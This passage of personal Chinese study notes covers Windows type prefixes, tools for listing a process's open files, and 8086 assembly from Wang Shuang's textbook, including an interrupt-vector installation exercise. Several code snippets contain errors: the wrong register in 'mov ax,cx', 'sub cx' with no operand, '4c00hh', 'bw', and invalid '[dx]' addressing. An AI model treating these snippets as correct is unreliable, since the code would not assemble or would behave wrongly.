<tr><td style="text-align: center">BYTE</td><td style="text-align: center">&quot;b&quot;</td><td style="text-align: center">uint8_t</td></tr>
<tr><td style="text-align: center">WORD</td><td style="text-align: center">&quot;w&quot;</td><td style="text-align: center">uint16_t</td></tr>
<tr><td style="text-align: center">DWORD</td><td style="text-align: center">&quot;dw&quot;</td><td style="text-align: center">uint32_t</td></tr>
<tr><td style="text-align: center">QWORD</td><td style="text-align: center">&quot;qw&quot;</td><td style="text-align: center">uint64_t</td></tr>
<tr><td style="text-align: center">LONG/ULONG</td><td style="text-align: center">&quot;l&quot;/&quot;ul&quot;</td><td style="text-align: center">long/unsigned long</td></tr>
<tr><td style="text-align: center">INT/UINT</td><td style="text-align: center">&quot;i&quot;/&quot;ui&quot;</td><td style="text-align: center">int/unsigned int</td></tr>
<tr><td style="text-align: center">SHORT/USHORT</td><td style="text-align: center"></td><td style="text-align: center"></td></tr>
<tr><td style="text-align: center">CHAR/UCHAR</td><td style="text-align: center">&quot;c&quot;/&quot;uc&quot;</td><td style="text-align: center">char/unsigned char</td></tr>
<tr><td style="text-align: center">STR</td><td style="text-align: center">&quot;sz&quot;</td><td style="text-align: center">32位字符串</td></tr>
<tr><td style="text-align: center">LPSTR/PSTR</td><td style="text-align: center">&quot;lpsz&quot;</td><td style="text-align: center">char*, terminate by zero</td></tr>
<tr><td style="text-align: center">TCHAR</td><td style="text-align: center"></td><td style="text-align: center">在Unicode平台是WORD，ANSI平台是BYTE</td></tr>
<tr><td style="text-align: center">LPTSTR</td><td style="text-align: center">&quot;lpsz&quot;</td><td style="text-align: center">TCHAR*</td></tr>
<tr><td style="text-align: center">HANDLE</td><td style="text-align: center">&quot;h&quot;</td><td style="text-align: center">句柄，可以认为是void*</td></tr>
<tr><td style="text-align: center"></td><td style="text-align: center">&quot;hwnd&quot;</td><td style="text-align: center">UI相关句柄</td></tr>
</tbody></table>
</div><div style="break-before: page; page-break-before: always;"></div><h2 id="文件"><a class="header" href="#文件">文件</a></h2>
<p>两个具体的需求：</p>
<ol>
<li>如何列出一个进程打开的所有<strong>文件</strong>（Linux:  <code>ls -l /proc/[pid]/fd/</code> 或 <code>lsof -p [pid]</code>）</li>
<li>如何列出打开一个文件所有的<strong>进程</strong>（Linux: <code>lsof [filename]</code>）</li>
</ol>
<p>使用<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">Process-exploer</a>工具，打开View-Low Pane View-Handles，就会列出进程打开的所有文件。</p>
<p>下载<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/">Sysinternals Suite</a>，这其中的<code>handle</code>工具和Linux的<code>lsof</code>很像，但是不知道为什么特别慢。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="basic"><a class="header" href="#basic">Basic</a></h1>
<center><b>
    这里记录了，本科阶段学习的重要的专业课程的笔记。质量参差不齐。随着知识的增长，会越来越深入，但是同样的“传播者误差”也会越来越严重。
</b></center>
<div style="break-before: page; page-break-before: always;"></div><h1 id="8086汇编笔记"><a class="header" href="#8086汇编笔记">8086汇编笔记</a></h1>
<blockquote>
<p>这篇文章是在我还不懂Markdown的时候写的，排版很乱。而且水平也很菜，只是因为内容很多舍不得删，留作纪念。</p>
</blockquote>
<p>8086汇编，王爽的《汇编语言（第三版）》阅读笔记。</p>
<h2 id="代码片段示例"><a class="header" href="#代码片段示例">代码片段示例</a></h2>
<h3 id="修改fl寄存器"><a class="header" href="#修改fl寄存器">修改FL寄存器</a></h3>
<pre><code class="language-assembly">pushf		;FL入栈
pop ax		;AX=FL
or ax,100h	;
push ax		;AX入栈
popf		;FL=AX
</code></pre>
<h3 id="循环四次"><a class="header" href="#循环四次">循环四次</a></h3>
<pre><code class="language-assembly">mov cx,4
loop:
  ...
  sub cx,1
jne loop
</code></pre>
<h3 id="函数"><a class="header" href="#函数">函数</a></h3>
<pre><code class="language-assembly">functionname proc near
;(word arg1 4,word arg2 6)	
	push bp
	mov bp,sp		        ;bp栈帧,方便参数的调用.构造堆栈框架(stack frame)
	push another register   ;保护寄存器
    sub sp,16               ;比如，我要开辟16个字节给临时变量（比如16个char）

    [bp+4]      ;使用传入的参数
    [bp-8]      ;使用开辟的变量
    
    add sp,16               ;释放我为临时变量开辟的的空间
	pop another register    ;恢复寄存器
    mov sp,bp               
	pop bp                  ;恢复bp
	ret 
functionname endp
</code></pre>
<p>这里并没有开辟局部变量，其实还少了。为什么这里不用恢复esp呢，因为没有给内存开辟位置，pop完就回去了。CSAPP这一部分讲的也很好。 调用:</p>
<pre><code class="language-assembly">mov ax,...
push ax
mov ax,...
push ax			;参数压栈,从右到左,上次作业写反了.便于可变参数函数的实现
call functionname
add sp,4		;栈指针回归,相当于出栈了
</code></pre>
<h3 id="地址的引用"><a class="header" href="#地址的引用">地址的引用</a></h3>
<pre><code class="language-assembly">data segment
  abc db 1,2,3,4
  xyz bw 1234h,5678h,9ABCh      ;内存真实情况：34h,12h,78h,56h
data ends

code segment
assume ds:data cs:code      ;这个也是伪指令，让编译器在缺省是自动填充
main:
  mov ax,data
  mov ds,ax                         ;开头先把段寄存器定义好了
  ;引用abc的元素2
  mov ah,abc[1]		;\直接引用
  mov ah,[abc+1]	;/
  ;引用xyz的元素5678h
  mov bx, offset xyz	;首地址
  mov ah,[bx+2]		;为啥+2？注意汇编语言是很老实的，+1就是地址+1,C语言中指针+1是和类型有关的
  ;引用abc的元素2
  mov bx,1		;下标
  mov ah,abc[bx]	;\
  mov ah,[abc+bx]	;/
  ;引用abc的元素2
  mov bx,offset abc	;首地址
  mov si,1		    ;下标
  mov ah,[bx+si]	;
</code></pre>
<h3 id="屏幕控制"><a class="header" href="#屏幕控制">屏幕控制</a></h3>
<p>在dos中可以直接控制硬件，现在的操作系统都是会保护的</p>
<ol>
<li>
<p>文本模式：text mode</p>
<pre><code class="language-assembly">;调用int 10中断，将显卡切换到文本模式（默认）：
mov ah,0
mov al,3h
int 10h         ;80×25
显示文字（ASCII字符）：
</code></pre>
<pre><code class="language-assembly">mov ax,0b800h		    ;显存对应的地址
mov es,ax
mov byte ptr es:[0],'A'	;想要显示的字符
mov byte ptr es:[1],70h	;7-&gt;白色背景 0-&gt;黑色前景
			            ;一般的对于(x,y)坐标，偏移地址=(y×80+x)×2
</code></pre>
</li>
<li>
<p>图形模式：graphic mode</p>
<pre><code class="language-assembly">;调用int 10中断，将显卡切换到图形模式：
mov ah,0
mov al,13h
int 10h                 ;320×200分辨率,256色
mov ax,0A000h           ;显存对应的地址
mov es,ax               
mov byte ptr es:[0],4   ;在（0,0）画一个红点
</code></pre>
</li>
</ol>
<h3 id="空循环"><a class="header" href="#空循环">空循环</a></h3>
<pre><code class="language-assembly">   mov bx, 200h
wait_wait:
   mov dx, 0
wait_a_while:
   sub dx, 1
   jnz wait_a_while
   sub bx, 1
   jnz wait_wait
</code></pre>
<h3 id="对齐"><a class="header" href="#对齐">对齐</a></h3>
<pre><code class="language-assembly">data segment
        ......
date ends
;当程序刚开始运行运行时，DOS会分配psp内存。psp段长度为100h，位置在程序的首段前。psp存放了关于程序的一些有用信息，比如命令行参数在psp:80h。
;DOS会把自动ds与es赋值为psp段址（program segment prefix）
;再赋值ss:sp=堆栈地址：堆栈长度      ;如果程序没有定义堆栈段，操作系统默认赋值 ss=程序首段的段地址，sp=0（最长）
;再赋值cs:ip=代码段地址：main的偏移地址

;对齐：如果data（前一个）段后的地址不能成为段地址（地址的末位非0），那么code（后一个）段会对齐到下一个能成为段地址的地址，中间用0填充
code segment 
        ......
code ends

stk segment stack
        db 200h dup(0)
stk ends        ;定义堆栈段
;操作系统会自动把ss赋值为stk,sp赋值为栈长度
;不要在堆栈段定义数据，操作系统不保证栈指针之前（上？）的数据完好。
</code></pre>
<h3 id="字母转大写"><a class="header" href="#字母转大写">字母转大写</a></h3>
<pre><code class="language-assembly">and byte ptr [si],0dfh  ;因为大写字母和小写字母就差了一个位 
</code></pre>
<h3 id="修改中断函数"><a class="header" href="#修改中断函数">修改中断函数</a></h3>
<pre><code class="language-assembly">assume cs:code
code segment
start:	mov ax,cx
	mov ds,ax	
	mov si,offset do0	;设置ds:si指向源地址
	mov ax,0
	mov es,ax
	mov di,200h		;es:di指向目标写地址
	mov cx,offset do0end-offset do0	;写长度，常量算数表达式

	loop1:
	  mov ax,ds:[si]
	  mov es:[di],ax
	  add si,1
	  add di,1
	  sub cx
	  ja loop1
	
	mov ax,0
	mov es,ax
	mov word ptr es:[0*4],200h
	mov word ptr es:[0*4+2],0h	;设置中断表
;这一段，称为安装过程，把中断代码写到内存，首地址写到中断表
	mov ax,4c00h
	int 21h

do0:	jmp short do0start
	str db &quot;overflow&quot;		;把数据和代码混在同一个段的技巧
do0start:
	mov ax,cs
	mov ds,ax
	mov si,202h		;设置ds:si指向安装后的字符串首
	
	mov ax,0b800h
	mov es,ax
	mov di,0		;设置es:di指向显存映射的地址

	mov cx,9		;字符串长度
s:	mov al,ds:[si]
	mov es:[di],al
	add si,1
	add di,2		;回忆显存映射，两个字节什么意思
	sub cx,1
	ja s

	mov ax,4c00hh
	int 21h
do0end:	nop
code ends
end start
</code></pre>
<h3 id="短跳的反向跳跃"><a class="header" href="#短跳的反向跳跃">短跳的反向跳跃</a></h3>
<pre><code class="language-assembly">je not_equal
jmp euqal   ;所有的条件跳转都是短跳，无条件跳转编译器会帮你决定
not_equal:
...		中间距离太长,短跳跳不到
equal:
</code></pre>
<h2 id="寄存器参考"><a class="header" href="#寄存器参考">寄存器参考</a></h2>
<ul>
<li>
<p>通用寄存器ax,bx,cx,dx     ;这个是有高8位和低8位的，高位ah,低位al (针对通用寄存器)</p>
</li>
<li>
<p>地址寄存器bx,bp,si,di      ;除了Si，其他3个也可以参加计算</p>
</li>
<li>
<p>段寄存器  cs,ds,ss,es       （通过寄存器赋值）</p>
<ul>
<li>cs : code segment</li>
<li>ds : data segment （决定了要读取内存的段地址<code>ds:[addr];</code>我们只能通过寄存器给ds赋值）</li>
<li>ss : stack segment （ss&amp;si   栈指针）</li>
<li>es : extra segment</li>
</ul>
</li>
<li>
<p>IP和CS配合使用，决定了当前要读取指令的地址，</p>
</li>
<li>
<p>FL标志寄存器。flag是按照位起作用的，mov指令不影响任何标志位。inc,dec也不会。</p>
</li>
</ul>
<div class="table-wrapper"><table><thead><tr><th>位数</th><th>名称</th><th>意义</th><th>备注</th></tr></thead><tbody>
<tr><td>第0位</td><td>CF：进位标志</td><td>执行结果若向（虚空最高位）进位，CF置1：如97H-98H<br/>位移运算会把移出来的存到CF，加法进位/减法借位会让CF置1,位移运算移出来的位也会改变CF<br/>其实CF就是无符号数的溢出，对有符号数意义不大</td><td>jc:jump if c	jnc:jump if not CF	jc和jb等价<br/>adc ah,0:AH=AH+0+CF	add_with_carry<br/>clc:clear carry flag	stc:set carry flag	cmc:complement carry flag(取反)</td></tr>
<tr><td>第2位</td><td>PF：奇偶标志</td><td>结果的低8bit 中1的个数，若为偶数，PF置1</td><td>jp 或 jpe (even) ; jnp,jpo (odd) ; 用于早期通讯的奇偶校验</td></tr>
<tr><td>第4位</td><td>AF：辅助进位标志auxiliary flag</td><td>低4位是否向高4位进位或借位,和BCD码(Binary Coded Decimal)有关</td><td>19h ==&gt; 00010011，而BCD的19 <em>0001 1001</em>   +1 <em>0001 1010</em> = 1A   。但实际上我想要20(0010 0000),要调整，+6<br/>;daa:decimal adjust for add     因为BCD码加减的时候会出现错误，所以需要调整。只针对AL寄存器中的值进行调整。 aaa:ascii adjust for add</td></tr>
<tr><td>第6位</td><td>ZF：零标志位</td><td>;执行相关指令的结果，若为0，ZF置1</td><td>jz:jump if zero ; jnz:jump if not zero  je和jz完全等价</td></tr>
<tr><td>第7位</td><td>SF：符号标志</td><td>;执行结果中若结果为负（补码而言），SF置1。跟随运算结果的最高位（符号位）</td><td>;js:jumo if signflag（负）  jns:</td></tr>
<tr><td>第8位</td><td>TF：跟踪标志，陷阱标志(Trace/Trap Flag)</td><td>若TF为1，CPU在执行完指令后会调用单步中断的中断处理程序int 1h</td><td></td></tr>
<tr><td>第9位</td><td>IF：</td><td>当CPU检测到可屏蔽的中断信息时，如果IF=1，CPU在执行完当前指令后响应中断；如果IF=0，则不响应可屏蔽中断</td><td>IF=1允许硬件中断，允许计算机硬件向CPU发出中断请求。硬件中断一定是由某一个事件触发的，如用户敲键盘、时钟中断，而不是程序员写int指令实现的。<br/>cli:让IF=0，禁止中断，sti:让IF=1，允许中断</td></tr>
<tr><td>第11位</td><td>OF：溢出标志</td><td>;执行结果超出数据范围（最高位）（有符号数而言），OF置1</td><td>OF对无符号数意义不大<br/>正+正=负、负+负=正，称为溢出；正负相加不会溢出。<br/>;jo:jump if overflow  jno:</td></tr>
<tr><td>第10位</td><td>DF:方向标志(Direction flag)</td><td>DF=0为正方向（低地址到高地址）</td><td>cld:让DF=0;      std:让DF=1<br/>源首地址&lt;目标首地址，赋值按照反方向，源首地址&gt;目标首地址，赋值按照正方向。当然，这只在地址有重叠的时候重要</td></tr>
<tr><td></td><td></td><td></td><td></td></tr>
</tbody></table>
</div>
<pre><code>	adc ax,bx	;ax=ax+bx+CF
		用以实现加法的进位
	sbb ax,bx	;ax=ax-bx-CF
		用以实现减法的借位
    clc stc :clear/set CF
    cli sti : clear/set IF
    cld std : clear/set DF
</code></pre>
<ol start="5">
<li>memory
地址寄存器register： bx,bp,si,di表示地址
8086寻址模式：地址=段地址*16+偏移地址
逻辑地址：  1000h:0ffffh ，物理地址：1ffffh。
显然，一个逻辑地址对应一个物理地址，但是一个物理地址可以对应多个逻辑地址。</li>
</ol>
<pre><code>ds:[bx].idata[si/di]    
ss:[bp].idata[si/di]    ;寻址组合方式，段地址不能用常数表示
    bp默认和ss对应，这就是栈
</code></pre>
<p>偏移地址可以用常数表示，称为直接寻址
偏移地址可以用上述四个寄存器表示
register/ b?+?i / b?+?i+idata，称为间接寻址
在没有寄存器确定操作内存单元大小时，要显示指明：
mov <em>word ptr</em> ds:[0],1
inc <em>byte ptr</em> [bx]
段跨越：通过在操作数钱添加一个段前缀（segment prefix），如cs:[bx]，强制改变操作数的段地址，否则的话bp默认对应ss，其他默认是ds</p>
<!-- 没有疑问，确实如此 -->
<ol start="6">
<li>“开辟”内存，这些都是伪指令，给编译器用的。</li>
</ol>
<pre><code>  db	 define byte		1byte	char，  例：length db 10h
  dw	 define word		2byte
  dd	 define double		4byte	float,int
  dq	 define quad word	8byte	double/__int64(long long int) %I64d		
  dt	 define ten byte		10byte	long double %Lf
  dup 重复定义 如：db 10 dup {0}
</code></pre>
<ol start="7">
<li>
<p>小端规则little endian(Intel) 
低地址存低位
任何指令的源操作数和目标操作数的宽度一定一样。常数是没有宽度的。</p>
</li>
<li>
<p>ptr 
byte ptr        1字节
word ptr        2字节
dword ptr       4字节
fword ptr	48bit 16bit段地址+32bit偏移地址
qword ptr	8word
tword ptr	10word</p>
</li>
</ol>
<p>near ptr 近，当前指令和目标地址在同一个段内
far ptr 远，跨段跳
一般和jump，call连用，这两个修饰标号</p>
<h2 id="指令参考"><a class="header" href="#指令参考">指令参考</a></h2>
<h3 id="计算指令"><a class="header" href="#计算指令">计算指令</a></h3>
<p>加减法指令</p>
<pre><code>add，sub 不能地址+地址
inc ax	;++指令，比add快,而且不会影响CF寄存器
adc ax,bx	;带进位加ax=ax+bx+CF
dec ax	;--不影响CF寄存器
sbb ax,bx	;带借位减ax=ax-bx-CF
neg ax	;求相反数,会影响CF,ZF,SF等标志位,ax=0-ax
cmp ax,bx	;只改变标志位的sub
</code></pre>
<p>idiv符号除法，div除法指令</p>
<pre><code>    div bl			;16bit/8bit  商在AL，余数在AH，被除数默认在AX
    div word ptr ds:[bx]	;32bit/16bit 商在AX，余数在DX，被除数默认在DX:AX
    ;在80386下，还可以64bit/32bit：
    div ax          ;商在EAX，余数在EDX，被除数默认在EDX:EAX
</code></pre>
<p>imul符号乘法，mul乘法指令</p>
<pre><code>	mul bl			;8bit*8bit	结果在AX，另一个乘数默认在AL
	mul word ptr ds:[bx]	;16bit*16bit	结果在DX:AX，另一个乘数默认在AX
    ;在80386下，还可以32bit*32bit：
	mul ecx          ;结果在EDX:EAX，另一个乘数默认在EAX
</code></pre>
<h3 id="位运算指令"><a class="header" href="#位运算指令">位运算指令</a></h3>
<p>在8086中，位移数大于1需要通过寄存器cl；在80386中没有这个限制</p>
<p>and     &amp;				使得1位不变，0位变0
or	    |				使得0位不变，1位变1
xor	    ^		<code>xor ax,bx</code>	使得0位不变，1位取反
not	    ~		<code>not ax	</code>	
shl	    &lt;&lt;	逻辑左移	<code>shl ax,1</code><br />
shr	    &gt;&gt;	逻辑右移<br />
rol 	_rotl()	循环左移    <code>rol ax,cl	x&lt;&lt;n | x&gt;&gt; sizeof(x)*8-n</code>
ror	    _rotr()	循环右移
sal		算数左移,算数左移和逻辑左移是等价的
sar		算数右移
rcl		带进位循环左移
rcr		带进位循环右移
test    和and一样，但是丢弃结果</p>
<h3 id="转移指令"><a class="header" href="#转移指令">转移指令</a></h3>
<ul>
<li>无条件跳转 jmp </li>
</ul>
<!--疑惑之处：这里近跳和短跳是不是相对寻址，可以试一下 -->
<pre><code>jmp short flag		;转移范围在127		短跳,跳跃距离只有一个字节.故指令一共四位
						    ;所有的条件跳转都是短跳,所以可能会出现跳不到的情况.可以用反向跳跃

jmp near ptr flag	;转移范围在32767	近跳,跳跃距离两个字节,后面除了跟标号还可以跟16bit寄存器或16bit变量
jmp reg			//IP=reg 16bit
jmp word ptr ds:[0]	//IP

jmp far	ptr flag	 ;远跳,jmp 段地址:偏移地址,是直接寻址了不是相对了
					        ;jmp dword ptr/32 bit 变量,同样也是直接寻址.
					        ;但是jmp 1234:5678 常数跳转直接这样写会报错要用机器编码
					        ;db ea		;long jmp的机器码
				            ;dw 1234h
					        ;dw 5678h
					        ;标号跳转,不需要加标号,编译器会自动判断.
jmp dword ptr ds:[0]	//CS高地址 IP低地址
</code></pre>
<ul>
<li>loop flag	;和下面的代码等效
<pre><code>  cx--;
  if (cx!=0) goto flag;
</code></pre>
</li>
<li>条件跳转(都是短跳)
ja  jb  jae jbe	针对非符号数比较的跳转		根据CF判断(ZF)
jg,jl,jge,jle       针对符号数比较的跳转		根据<code>SF==OF</code>判断(ZF)（jl SF!=OF）
je   jne   jz  jnz  判断是否相等（je和jz等价）
jc  jnc     根据CF判断，换句话说jc和jb等价
js  jns     根据SF判断，js就是说如果是负数就跳转，不知有什么用
jo  jno    根据OF判断，jo就是说如果溢出就跳转，不知有什么用
jcxz        根据CX（不是标志寄存器哦）判断，如果<code>cx==0</code>就跳转。多半和循环配合使用。
格式: jxxx flag
调用指令：
int     中断
iret    中断的返回（详见后面的中断部分）</li>
</ul>
<p>call dest   近调用，需要压入偏移地址</p>
<pre><code>    call flag	    ;push ip;jmp short ptr flag
    call word ptr ds:[dx] ;push ip;jmp short ptr ds:[dx]
    call reg      ;感觉这个有函数指针的味了
</code></pre>
<p>ret/retn	    //pop ip，近返回
ret/retn count  //pop ip,SP+=count，用于被调用者清理参数的情况。</p>
<p>call dest   远调用，需要压入完整的位置 push CS,push IP,CS:IP = dest</p>
<pre><code>call far ptr flag	    ;push cs;push ip;jmp far ptr flag 
call dword ptr ds:[dx]      ;低位存低地址，高位存高地址
</code></pre>
<p>retf		//pop ip，pop cs，远返回</p>
<h3 id="和栈有关的指令"><a class="header" href="#和栈有关的指令">和栈有关的指令</a></h3>
<p>push 压栈</p>
<p>push 后面只可以跟一个16位的寄存器或者word ptr的内存地址</p>
<pre><code>		sp=sp-2;
		ss:[sp]=word ptr source;
</code></pre>
<p>pop出栈</p>
<pre><code>		desti=word ptr ss:[sp];
		sp=sp+2;
</code></pre>
<p>pushf	把标志寄存器压栈
popf	把标志寄存器出栈,不可以pop FL</p>
<p>注意 push FL,IP	错误,任何指令都不可以 <em>直接引用</em> 这两个寄存器
注意 pop FL,IP,CS	错误,CS不能 <em>直接修改</em></p>
<p>8086  push/pop后面可以跟16位的寄存器和变量。
80386 push/pop后面可以跟32位的寄存器，变量，常数。上面变成±4</p>
<h3 id="地址传送指令"><a class="header" href="#地址传送指令">地址传送指令</a></h3>
<ul>
<li>取地址LEA最常用
格式 lea reg,mem</li>
</ul>
<pre><code>		lea dx,ds:[1000h]	&lt;=&gt;	mov dx,1000h
		lea dx,abc		&lt;=&gt;	mov dx,offset abc
		lea dx,ds:[bx+si+3]	&lt;=&gt;	dx=bx+si+3,简化加法运算,是mov不可取代的.	
		lea eax,[eax+eax*4]	&lt;=&gt;	eax=eax*5,简化乘法运算
</code></pre>
<ul>
<li>lds和les
格式 lds reg,mem</li>
</ul>
<pre><code>les si,[]		;从内存中读出远指针地址存放到 es:si，同下咯
lds di,es:[1000h]		;从内存中读出远指针地址存放到 ds:di。就是
    ;mov di , word ptr es:[1000h]
    ;mov ds, word ptr es:[1002h] ,意会一下，不可以对ds这么操作。
les edi,[]		;从内存中读出48位远指针(16:32)存放到es:edi
</code></pre>
<ul>
<li>LAHF,SAHF,PUSHF,POPF，标志寄存器传送指令</li>
</ul>
<pre><code>    lahf    ;Load AH with Flags，把FL的低8位装到AH。
    sahf    ;Store AH in Flags，把AH存入FL的低八位。
    pushf   ;把FL压入堆栈，这就不止8位了。
    popf    
</code></pre>
<h3 id="其他指令"><a class="header" href="#其他指令">其他指令</a></h3>
<ul>
<li>
<p>xchg ax,bx	交换ax,bx的值.</p>
</li>
<li>
<p>符号扩充指令 和idiv指令配合。没有操作数
cbw	把AL扩充成AX		convert byte to word
cwd	把AX扩充成DX:AX		convert word to dword
cdq	把EAX扩充成EDX:EAX	convert dword to qword</p>
</li>
<li>
<p>扩充指令	mov by zero extention &amp; mov by sign extension
movzx ax,al	&lt;=&gt; mov ah,0
movzx ax,bl	;零扩充
movsx eax,al	;符号扩充
上面那三个指令相形见绌</p>
</li>
</ul>
<p>换码指令:xlat (translate)或叫查表指令,用法如下。没有操作数</p>
<pre><code>{
    char t[]=&quot;0123456789ABCDEF&quot;
    int i=10;
    i=t[i];    
} //C语言代码，翻译如下
	mov ax,seg t
	mov ds,ax
	mov bx,offset t	;让ds:bx指向表t首地址
	mov al,10	;al为下标
	xlat		;al=ds:[bx+al]
</code></pre>
<p>in,out  对端口进行读写</p>
<h3 id="字符串指令"><a class="header" href="#字符串指令">字符串指令</a></h3>
<p>movs 字符串传送
cmps 字符串比较
scas 字符串扫描
stos 存入字符串
lods 从字符串取
一些前缀：
rep 重复
repe、repz 如果相等则重复
repne、repnz    如果不相等则重复
<code>es:[di]多半被写，ds[si]多半被读</code></p>
<ul>
<li><strong>movsb</strong>字符串传送指令(strncpy) </li>
</ul>
<pre><code>	rep movsb	;repeat move string by byte
	;相当于如下指令
    again:
    	if (cx==0) goto done;	cx规定了repeat的次数
	    
        byte ptr es:[di] = byte ptr ds:[si]
	    if (df == 0)	;df 方向flag,cld&amp;std操作df	
		    {si++; di++}
	    else	
		    {si--; di--}    //中间这一块是movsb
	    
        cx--;
	goto again
	;如果没有rep,执行一次,不改变cx
	;类似的也有movsw,movsd
</code></pre>
<ul>
<li><strong>cmpsb</strong>字符串比较指令</li>
</ul>
<pre><code>	cmpsb   ;比较byte ptr ds:[si] 

	repe cmpsb	;repe: repeat if equal,有两个循环条件 
	again:
	if (cx==0) goto done
	
    cmp byte ptr ds:[si], es:[di]       //注意repe/repne所依据的ZF就是这一句决定的
	if (df == 0)	;df 方向flag,cld&amp;std操作df	
		{si++; di++;}
	else	
        {si--; di--;}
    
    cx--;
	if (ZF == 1) goto again
	done:
</code></pre>
<ul>
<li><strong>stosb</strong>		;存入字符串指令  store byte，自然也有stosw--ax;stosd--eax</li>
</ul>
<pre><code>	es:[di] = al;
	if (df == 0)
        di++;		
    else 
        di --;
	同样的也能和rep配合使用
</code></pre>
<ul>
<li><strong>lodsb</strong>		;加载al的内容</li>
</ul>
<pre><code>	al = ds:[si]
    if (df == 0)
	    si++;
    else 
        si --;
	一般不和rep连用... 自然也有lodsw,lodsd
</code></pre>
<ul>
<li><strong>scasb</strong>  字符串扫描指令，用于在字符串中查找一个字符。
<code>repne scasb</code> 等价于如下指令</li>
</ul>
<pre><code>agian:
    if (cx==0) goto done;
    cmp al,es:[di];  //这一句决定FL
    if (df == 0)
        inc di  ;
    else 
        dec di  ;
    cx--;
    if (ZF == 0) goto again;
done:
</code></pre>
<h2 id="中断"><a class="header" href="#中断">中断</a></h2>
<p>中断表的初始化由bios和dos负责填入
用户可以修改中断向量,但是保存的时候通常需要保存原来的中断向量以便让我们的代码和老代码链接起来 
比如,在前面加一个判断执行自己的私货,再跳到原本的中断
<em>hook技术</em>:改变系统功能</p>
<p>在8086CPU中,中断表在0000:0000-0000:03FF,占400h个字节,保存100h个中断向量(一个4字节,远指针)
int 21h是DOS系统的内核,其代码是微软写的,代码保存在磁盘上.与视频的输出有关.函数地址保存在0:84h处
int 16h,与键盘的输入有关
int 13h,与磁盘的输入输出有关
int 10h是BIOS的一部分，其代码是主板的厂家写的，代码保存在ROM中。
（1）内中断
int指令都执行了什么动作</p>
<pre><code>	取得中断类型码
	pushf		;标志寄存器入栈
	TF=0 IF=0	;设置TF与IF位为0 ,禁止外部中断和单步中断
	push CS
	push IP
	IP=0000h:[4*N] 
    CS)=0000h:[N*4+2]	;读取存放在 中断表的 中断处理程序 的入口地址
</code></pre>
<p>iret执行了什么动作</p>
<pre><code>	pop IP
	pop CS
	popf		
</code></pre>
<p>中断过程：</p>
<ul>
<li>保存用到的寄存器，转移控制（隐含在int）</li>
<li>处理中断</li>
<li>恢复用到的寄存器，转移控制（隐含在iret）</li>
</ul>
<p>可屏蔽中断是CPU可以不响应的外中断，不可屏蔽中断是CPU必须响应的外中断。
中断函数要求保护每个寄存器,普通的函数只需要保护四个就可以了bx,bp,....
常用中断</p>
<pre><code>exit：
    AH = 4Ch
    AL = return code
    int 21h		
getchar：
    AH = 01h
    int 21h		
    AL = read char
putchar：
    AH = 02h
    DL = write char
    int 21h
puts：
    AH = 09h
    DS:DX -&gt; the addr of string,    以$作为字符串结尾
    int 21h
gets：
    AH = 10h
    DS:DX -&gt; the addr of buffer     但是buffer从第二位开始才是读入的内容，第0位是最大长度，第1位是读入长度。换行符被舍弃，回车符被读入但是不算在计数中。
    int 21h
</code></pre>
<h1 id="笔记二"><a class="header" href="#笔记二">笔记(二)</a></h1>
<h3 id="8086cpu"><a class="header" href="#8086cpu">8086CPU</a></h3>
<p>A000-F000段均不是用户的内存空间
POST（Power On Self Test）（开机引导程序）位于ROM中，映射到F000段，可读可执行不可写。
DOS留给用户的内存空间：0000:0000-9000：FFFF 640K的空间</p>
<h3 id="bios和dos提供的中断例程的安装"><a class="header" href="#bios和dos提供的中断例程的安装">BIOS和DOS提供的中断例程的安装</a></h3>
<p>(1)开机后，CPU加电，初始化 CS=0ffffh,IP=0,自动从FFFF:0000开始执行程序。
FFFF:0000有一段跳转指令，CPU执行该指令后，转去执行BIOS中的硬件系统检测和初始化程序。
(2)初始化程序将建立BIOS所支持的中断向量，即将BIOS提供的中断例程入口地址登记在中断向量表中。
注意，对于BIOS所提供的中断例程，只需将入口地址登记在中断向量表中即可，因为他们是固化到ROM中的程序，在内存中一直存在。
(3)硬件系统检测和初始化完成后，调用int 19h进行操作系统的引导。从此将计算机交给操作系统控制。
(4)DOS启动后，除完成其他工作外，还将它所提供的中断例程装入内存，并建立相应的中断向量。</p>
<h3 id="端口port"><a class="header" href="#端口port">端口port</a></h3>
<p>CPU -- port -- I/O
端口编号就是端口地址，范围在[0000h,0FFFFh]。
是不是有点奇怪为什么端口号和中断表的地址重合了？因为在8086中采用了独立编址，I/O地址与存储器地址分开，采用专门指令来访问I/O。LC3采用了统一编址，I/O占用存储器地址空间，无须专门的I/O指令。
<a href="https://blog.csdn.net/yinwei520/article/details/6114027?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf">参考链接</a>
<img src="Basic/../images/1596179819014.png" alt="王爽汇编" />
约定的，60h与键盘相关，70h\71h与cmos相关
用in和out指令控制</p>
<pre><code>        in al,60h       ;从60h端口中读取一个字节到AL
        in ah,dx        ;第一个操作数只能是ah/al，第二个只能是dx或00h-0ffh之间的立即数
        out 70h,al    ;把AL的内容发送给端口71h
</code></pre>
<p>汇编语言级别 高级--中级--低级	;调用方式越来越难，功能越来越强
①DOS级别</p>
<pre><code>	如：c=getchar();
	mov ah,1
	int 21h
</code></pre>
<p>②BIOS级别</p>
<pre><code>	如：key=bioskey(0);
	mov ah,0
	int 16h
	能读取F1-F12功能键，Home/Up/Down/End等功能键
</code></pre>
<p>③端口级别</p>
<pre><code>	如：key=inport(0x60)
	in al,60h		;这里只是核心代码，其实还有很多准备工作。
	能读取到Ctrl键等
</code></pre>
<h3 id="386与use16"><a class="header" href="#386与use16">.386与use16</a></h3>
<p>开始的时候加一个.386,每个segment后面加一个use16，表示仍然是16位寻址模式</p>
<ol>
<li>32位比16位多了<code>[reg+reg*n+im]</code>这种寻址方式。
其中n=2/4/8
reg可以 ebx,ebp,esi,edi  eax,ecx,edx,esp 里任选
如：<code>mov eax,[ebx+esi*4]</code>
符合C语言的寻址方式 如 <code>long a[4]</code>
ebx:数组a的首地址，esi:下标，4:sizeof(long)	</li>
<li>mul指令
;如果参数是 r8/m8,   将把  AL 做乘数, 结果放在 AX
;如果参数是 r16/m16, 将把  AX 做乘数, 结果放在 DX:AX
;如果参数是 r32/m32, 将把 EAX 做乘数, 结果放在 EDX:EAX
imul 符号乘法
imul 有和mul相同的用法</li>
</ol>
<pre><code>imul eax,ebx	;eax*=ebx	①
